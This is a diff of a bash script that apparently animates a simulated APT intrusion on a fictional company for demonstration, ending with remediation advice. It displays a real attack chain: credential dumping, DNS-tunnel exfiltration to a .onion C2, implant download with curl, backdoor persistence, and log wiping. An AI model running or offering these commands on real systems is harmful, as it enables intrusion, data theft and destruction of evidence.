+echo "RCffqd2oYni4WIRrwL8HQTyvNwMSJGNC6zV7scIJNsQk/LAQCK0k2TI24fAKq72nKiCLeK"
+echo "UaKSyIpY+UBOJah6Oro9UGxCwZny/E+YNUwPz0ys8UwN0SPz+Jgq/ZJUE0099LhWzRzfjy"
 echo "-----END OPENSSH PRIVATE KEY-----"
 sleep 0.4
 
@@ -706,12 +722,13 @@ echo -e "${G}[+]${NC} ${W}SSH private key obtained for lateral movement${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}cat /home/jsmith/Documents/passwords.txt${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}cat /home/jsmith/Documents/passwords.txt${NC}"
 sleep 0.3
 echo -e "${Y}=== Personal Password Manager ===${NC}"
-echo -e "${GR}VPN: jsmith / ${R}VpnP@ss!Secure2024${NC}"
+echo -e "${GR}VPN: jsmith : ${R}VpnP@ss!Secure2024${NC}"
 echo -e "${GR}Domain Admin: ${R}Admin@Quantum2024!${NC}"
-echo -e "${GR}Email: jsmith@quantumsecure.corp / ${R}Em@il2024Secure${NC}"
+echo -e "${GR}Email: jsmith@quantumsecure.corp : ${R}Em@il2024Secure${NC}"
 echo -e "${GR}AWS Console: ${R}AwS!SecretK3y2024${NC}"
 sleep 0.5
 
@@ -723,15 +740,13 @@ echo -e "${GR}    ├─ SSH private keys for lateral movement${NC}"
 echo -e "${GR}    └─ AWS cloud credentials${NC}"
 sleep 0.5
 
-# ============================================================================
-# PHASE 9: DATABASE COMPROMISE
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 9: DATABASE SERVER COMPROMISE                          ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
+## ============================================================================
+## PHASE 9: DATABASE COMPROMISE
+## ============================================================================
 sleep 0.4
-
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}mysql -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2} -e 'SHOW DATABASES;'${NC}"
+##
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}mysql -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2} -e 'SHOW DATABASES;'${NC}"
 sleep 0.5
 echo -e "${GR}+--------------------+${NC}"
 echo -e "${GR}| Database           |${NC}"
@@ -748,7 +763,8 @@ echo -e "${GR}+--------------------+${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}mysql -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2} quantumsecure_prod -e 'SHOW TABLES;'${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}mysql -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2} quantumsecure_prod -e 'SHOW TABLES;'${NC}"
 sleep 0.4
 echo -e "${GR}+----------------------------+${NC}"
 echo -e "${GR}| Tables_in_quantumsecure    |${NC}"
@@ -764,21 +780,19 @@ echo -e "${GR}+----------------------------+${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}mysqldump -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2} --all-databases > /tmp/db_complete_dump.sql${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}mysqldump -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2} --all-databases > /tmp/db_complete_dump.sql${NC}"
 sleep 0.4
-progress_bar_advanced 2.5 "Dumping all databases from production server..."
+progress_bar_advanced 3 "Dumping all databases from production server..."
 echo -e "${G}[+]${NC} ${W}Database dump completed: 847.3 MB${NC}"
 sleep 0.4
 
-# ============================================================================
-# PHASE 10: LATERAL MOVEMENT TO DOMAIN CONTROLLER
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 10: LATERAL MOVEMENT - DOMAIN CONTROLLER BREACH        ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
+## ============================================================================
+## PHASE 10: LATERAL MOVEMENT TO DOMAIN CONTROLLER
+## ============================================================================
 
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}crackmapexec smb ${DC_IP} -u admin -p 'Admin@Quantum2024!' --shares${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}crackmapexec smb ${DC_IP} -u admin -p 'Admin@Quantum2024!' --shares${NC}"
 sleep 0.5
 echo ""
 echo -e "${GR}SMB         ${DC_IP}     445    DC-PROD-01       [*] Windows Server 2019 Build 17763 x64 (name:DC-PROD-01) (domain:${TARGET_DOMAIN}) (signing:True) (SMBv1:False)${NC}"
@@ -797,9 +811,10 @@ echo -e "${G}SMB         ${DC_IP}     445    DC-PROD-01       SYSVOL          RE
 sleep 0.5
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}impacket-secretsdump ${TARGET_DOMAIN}/admin:'Admin@Quantum2024!'@${DC_IP}${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}impacket-secretsdump ${TARGET_DOMAIN}/admin:'Admin@Quantum2024!'@${DC_IP}${NC}"
 sleep 0.4
-spinner_anim "Dumping Active Directory credentials from DC" 2.5
+spinner_anim "Dumping Active Directory credentials from DC" 3
 echo ""
 echo -e "${G}[+]${NC} ${W}Dumping Domain Cached Credentials (domain/username:hash)${NC}"
 echo ""
@@ -817,23 +832,20 @@ echo -e "${W}mbrown:1106:aad3b435b51404eeaad3b435b51404ee:${R}fc525c9683e8fe0670
 sleep 0.15
 echo -e "${W}dlee:1107:aad3b435b51404eeaad3b435b51404ee:${R}a9f3b6c2d8e4f1a7b5c9d8e7f6a4b3c2${W}:::${NC}"
 sleep 0.4
-
-echo ""
+#
+#echo ""
 echo -e "${G}[+]${NC} ${W}${BOLD}DOMAIN ADMIN ACCESS ACHIEVED${NC}"
 echo -e "${GR}    Total domain users compromised: ${R}147${NC}"
 echo -e "${GR}    Domain admin accounts: ${R}3${NC}"
 echo -e "${GR}    Service accounts: ${R}12${NC}"
 sleep 0.5
-
-# ============================================================================
-# PHASE 11: DATA EXFILTRATION
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 11: SENSITIVE DATA EXFILTRATION                        ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
-
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}find /var/www /home -type f \\( -name '*.pdf' -o -name '*.docx' -o -name '*.xlsx' -o -name '*confidential*' -o -name '*secret*' \\) 2>/dev/null | head -12${NC}"
+#
+## ============================================================================
+## PHASE 11: DATA EXFILTRATION
+## ============================================================================
+#
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}find /var/www /home -type f \\( -name '*.pdf' -o -name '*.docx' -o -name '*.xlsx' -o -name '*confidential*' -o -name '*secret*' \\) 2>/dev/null | head -12${NC}"
 sleep 0.5
 echo "/var/www/html/uploads/Q4_Financial_Report_2024.pdf"
 echo "/var/www/html/uploads/Executive_Salaries_Confidential.xlsx"
@@ -844,18 +856,20 @@ echo "/home/jsmith/Documents/Project_Titan_Secret.docx"
 echo "/home/jsmith/Downloads/employee_ssn_list.xlsx"
 echo "/var/www/private/api_keys_production.txt"
 sleep 0.4
-
+#
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}tar -czf /tmp/exfil_package.tar.gz /tmp/db_complete_dump.sql /var/www/html/uploads/*.pdf /home/*/Documents/*.{xlsx,docx,pdf} /home/*/.ssh/id_rsa 2>/dev/null${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}tar -czf /tmp/exfil_package.tar.gz /tmp/db_complete_dump.sql /var/www/html/uploads/*.pdf /home/*/Documents/*.{xlsx,docx,pdf} /home/*/.ssh/id_rsa 2>/dev/null${NC}"
 sleep 0.4
-progress_bar_advanced 2.0 "Compressing sensitive data for exfiltration..."
+progress_bar_advanced 2 "Compressing sensitive data for exfiltration..."
 echo -e "${G}[+]${NC} ${W}Archive created: 1.87 GB${NC}"
 sleep 0.4
-
+#
 echo ""
 echo -e "${Y}[*]${NC} ${W}Establishing covert C2 channel via DNS tunneling...${NC}"
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}./dnscat2 --secret='GhostProtocol2024' --dns server=ns1.dark-phoenix-c2.onion${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}./dnscat2 --secret='GhostProtocol2024' --dns server=ns1.dark-phoenix-c2.onion${NC}"
 sleep 0.4
 spinner_anim "Initiating DNS tunnel for covert data exfiltration" 2
 echo ""
@@ -863,13 +877,13 @@ echo -e "${G}[+]${NC} ${GR}Encrypted DNS tunnel established${NC}"
 echo -e "${G}[+]${NC} ${GR}C2 server: ${W}${C2_SERVER}${NC}"
 echo ""
 
-for i in {1..15}; do
+for i in {1..20}; do
     subdomain=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 16)
     bytes=$((RANDOM % 512 + 128))
     echo -e "${DIM}[DNS] Query: ${subdomain}.exfil.dark-phoenix-c2.onion → TXT record (${bytes} bytes encoded)${NC}"
     sleep 0.05
 done
-
+#
 echo ""
 progress_bar_advanced 3.0 "Exfiltrating data via DNS tunnel (1.87 GB)..."
 echo -e "${G}[+]${NC} ${W}${BOLD}DATA EXFILTRATION COMPLETE${NC}"
@@ -877,52 +891,55 @@ echo -e "${GR}    Total data exfiltrated: ${R}1.87 GB${NC}"
 echo -e "${GR}    Exfiltration method: ${Y}DNS tunneling (covert)${NC}"
 echo -e "${GR}    Detection probability: ${G}LOW${NC}"
 sleep 0.5
-
-# ============================================================================
-# PHASE 12: PERSISTENCE MECHANISMS
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 12: DEPLOYING PERSISTENCE MECHANISMS                   ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
+#
+## ============================================================================
+## PHASE 12: PERSISTENCE MECHANISMS
+## ============================================================================
 
 echo -e "${Y}[*]${NC} ${W}Installing multiple persistence mechanisms for long-term access...${NC}"
 echo ""
 
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}curl -sL hxxps://malicious-cdn.onion/implant.elf -o /usr/lib/systemd/.core-daemon && chmod +x /usr/lib/systemd/.core-daemon${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}curl -sL hxxps://malicious-cdn.onion/implant.elf -o /usr/lib/systemd/.core-daemon && chmod +x /usr/lib/systemd/.core-daemon${NC}"
 sleep 0.4
 exploit_anim "Deploying rootkit-based persistence"
 echo -e "${G}[+]${NC} ${W}Rootkit installed: /usr/lib/systemd/.core-daemon${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}(crontab -l 2>/dev/null; echo '*/15 * * * * /usr/lib/systemd/.core-daemon >/dev/null 2>&1') | crontab -${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}(crontab -l 2>/dev/null; echo '*/15 * * * * /usr/lib/systemd/.core-daemon >/dev/null 2>&1') | crontab -${NC}"
 sleep 0.4
 echo -e "${G}[+]${NC} ${W}Cron persistence established (executes every 15 minutes)${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}useradd -m -s /bin/bash -G sudo -u 1337 sysupdate${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}useradd -m -s /bin/bash -G sudo -u 1337 sysupdate${NC}"
 sleep 0.3
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}echo 'sysupdate:UpdateP@ss2024!' | chpasswd${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}echo 'sysupdate:UpdateP@ss2024!' | chpasswd${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${W}Backdoor user created: sysupdate (UID 1337) with sudo privileges${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC7yN...[truncated]...ghost@kali' >> /root/.ssh/authorized_keys${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAXQMfdioW/ibO3rtEACYqplJjfYa2hSqQtfNIk4h7Dah+IrHeiN0m8vr2ldkso2gqQpvxFArJZ2EAiRtMQVfeTyauhd5rk0x8H00AfQABJDq6grldizuYy5tCC7V2Fw==ghost@kali' >> /root/.ssh/authorized_keys${NC}"
 sleep 0.4
 echo -e "${G}[+]${NC} ${W}SSH backdoor key installed for root access${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}echo 'kernel.yama.ptrace_scope=0' >> /etc/sysctl.conf && sysctl -p >/dev/null${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}echo 'kernel.yama.ptrace_scope=0' >> /etc/sysctl.conf && sysctl -p >/dev/null${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${W}System protections disabled for process injection${NC}"
 sleep 0.3
-
+#
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}cat > /etc/systemd/system/system-health.service << EOF"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}cat > /etc/systemd/system/system-health.service << EOF"
 echo "[Unit]"
 echo "Description=System Health Monitor"
 echo "[Service]"
@@ -930,14 +947,15 @@ echo "ExecStart=/usr/lib/systemd/.core-daemon"
 echo "Restart=always"
 echo "[Install]"
 echo "WantedBy=multi-user.target"
-echo "EOF"
-echo "${NC}"
+echo "EOF>>"
+echo ""
 sleep 0.4
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}systemctl enable system-health.service >/dev/null 2>&1${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}systemctl enable system-health.service >/dev/null 2>&1${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${W}Systemd persistence service installed${NC}"
 sleep 0.4
-
+#
 echo ""
 echo -e "${G}[+]${NC} ${W}${BOLD}PERSISTENCE FULLY ESTABLISHED${NC}"
 echo -e "${GR}    ├─ Rootkit implant (hidden process)${NC}"
@@ -946,26 +964,24 @@ echo -e "${GR}    ├─ Backdoor user account${NC}"
 echo -e "${GR}    ├─ SSH authorized key${NC}"
 echo -e "${GR}    └─ Systemd service${NC}"
 sleep 0.5
-
-# ============================================================================
-# PHASE 13: ANTI-FORENSICS & LOG SANITIZATION
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 13: ANTI-FORENSICS & LOG SANITIZATION                  ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
+#
+## ============================================================================
+## PHASE 13: ANTI-FORENSICS & LOG SANITIZATION
+## ============================================================================
 
 echo -e "${Y}[*]${NC} ${W}Removing forensic evidence and sanitizing logs...${NC}"
 echo ""
 
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}for log in /var/log/{auth,syslog,kern,messages,secure,wtmp,btmp,lastlog}*; do cat /dev/null > \$log 2>/dev/null; done${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}for log in /var/log/{auth,syslog,kern,messages,secure,wtmp,btmp,lastlog}*; do cat /dev/null > \$log 2>/dev/null; done${NC}"
 sleep 0.5
 spinner_anim "Clearing system logs" 1.5
 echo -e "${G}[+]${NC} ${W}System logs cleared${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}find /var/log -type f -name '*.log' -exec shred -vzn 7 {} \\; 2>/dev/null${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}find /var/log -type f -name '*.log' -exec shred -vzn 7 {} \\; 2>/dev/null${NC}"
 sleep 0.4
 echo -e "${DIM}shred: /var/log/nginx/access.log: pass 1/7 (random)...${NC}"
 sleep 0.1
@@ -981,25 +997,29 @@ echo -e "${G}[+]${NC} ${W}Web server and database logs overwritten (7-pass DoD)$
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}history -c && cat /dev/null > ~/.bash_history && ln -sf /dev/null ~/.bash_history${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}history -c && cat /dev/null > ~/.bash_history && ln -sf /dev/null ~/.bash_history${NC}"
 sleep 0.4
 echo -e "${G}[+]${NC} ${W}Command history erased and redirected to /dev/null${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}find /tmp /var/tmp -type f -atime -1 -delete 2>/dev/null${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}find /tmp /var/tmp -type f -atime -1 -delete 2>/dev/null${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${W}Temporary files removed${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}touch -r /etc/passwd /usr/lib/systemd/.core-daemon /root/.ssh/authorized_keys${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}touch -r /etc/passwd /usr/lib/systemd/.core-daemon /root/.ssh/authorized_keys${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${W}File timestamps normalized to match system files${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}sed -i '/.*${ATTACKER_IP}.*/d' /var/log/nginx/access.log.* 2>/dev/null${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}sed -i '/.*${ATTACKER_IP}.*/d' /var/log/nginx/access.log.* 2>/dev/null${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${W}Attacker IP addresses removed from archived logs${NC}"
 sleep 0.4
@@ -1020,10 +1040,6 @@ echo -e "\n${R}═════════════════════�
 echo -e "${W}${BOLD}                    ◆  OPERATION COMPLETE  ◆${NC}"
 echo -e "${R}═══════════════════════════════════════════════════════════════════════════${NC}\n"
 sleep 0.5
-
-echo -e "${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║              ADVANCED PERSISTENT THREAT - FINAL REPORT        ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
 
 echo -e "${W}${BOLD}OPERATION DETAILS:${NC}"
 echo -e "${GR}─────────────────────────────────────────────────────────────────${NC}"
@@ -1122,11 +1138,4 @@ echo -e "${C}[9]${NC} ${W}MEDIUM:${NC} Enable MFA on all accounts"
 echo -e "${C}[10]${NC} ${W}MEDIUM:${NC} Deploy SIEM with real-time alerting"
 echo -e "${C}[11]${NC} ${W}MEDIUM:${NC} Implement least-privilege access controls"
 echo -e "${C}[12]${NC} ${W}MEDIUM:${NC} Conduct security awareness training"
-echo ""
-
-echo -e "${R}═══════════════════════════════════════════════════════════════════════════${NC}"
-echo -e "${W}                   ${R}${BOLD}◆ OPERATION COMPLETE ◆${NC}"
-echo -e "${R}═══════════════════════════════════════════════════════════════════════════${NC}"
-echo ""
-echo ""
 echo ""
